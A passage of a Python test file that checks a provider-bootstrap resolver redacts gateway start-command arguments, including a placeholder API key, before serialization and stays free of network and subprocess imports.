    result = resolve_provider_bootstrap(env={}, config_path=_write(tmp_path, _LIFECYCLE_CONFIG))
    payload = result.to_dict()

    assert result.gateway_start_command == ("omniroute", "serve", "--port", "20128")
    assert payload["gateway_start_command"] == "omniroute <3 arguments redacted>"
    assert payload["gateway_ready_timeout_s"] == 12.5
    assert payload["field_sources"]["gateway_start_command"] == "config_file"
    # '20128' is excluded: it is legitimately the port of the recorded gateway_url.
    for argument in ("serve", "--port"):
        assert argument not in repr(payload), f"{argument!r} must not be serialized"


def test_to_dict_never_serializes_a_token_from_the_start_command(tmp_path: Path) -> None:
    """A token on the start command line must not reach a receipt or a log."""
    body = (
        _VALID_CONFIG + "gateway_start_command: [omniroute, serve, --api-key, sk-SECRETTOKEN123]\n"
    )
    result = resolve_provider_bootstrap(env={}, config_path=_write(tmp_path, body))

    assert result.gateway_start_command is not None
    assert "sk-SECRETTOKEN123" in result.gateway_start_command, "the runtime argv is unchanged"

    payload = result.to_dict()

    assert "sk-SECRETTOKEN123" not in repr(payload)
    assert "--api-key" not in repr(payload)
    assert payload["gateway_start_command"] == "omniroute <3 arguments redacted>"
    assert json.dumps(payload).find("SECRETTOKEN") == -1


def test_start_command_redaction_basenames_the_program_and_counts_arguments() -> None:
    """The rendered form names the binary, hides a path, and counts what it withheld."""
    assert redact_start_command(None) is None
    assert redact_start_command(()) == "<empty>"
    assert redact_start_command(("omniroute",)) == "omniroute"
    assert redact_start_command(("omniroute", "serve")) == "omniroute <1 argument redacted>"
    # A full path can disclose a home directory or a deployment layout.
    assert redact_start_command(("/home/alice/bin/omniroute", "--token", "x")) == (
        "omniroute <2 arguments redacted>"
    )


def test_resolver_still_never_starts_or_probes_a_gateway() -> None:
    """Adding lifecycle inputs must not add I/O to the resolver.

    Checked on the imports rather than on prose: the module docstring names
    ``subprocess`` to say it never uses one.
    """
    import ast

    import verdict.provider_bootstrap as module

    tree = ast.parse(Path(module.__file__).read_text(encoding="utf-8"))
    imported: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported.update(alias.name.split(".")[0] for alias in node.names)
        if isinstance(node, ast.ImportFrom) and node.module:
            imported.add(node.module.split(".")[0])
    for forbidden in ("subprocess", "socket", "httpx", "urllib3", "requests"):
        assert forbidden not in imported, f"the resolver must stay offline, imported {forbidden}"
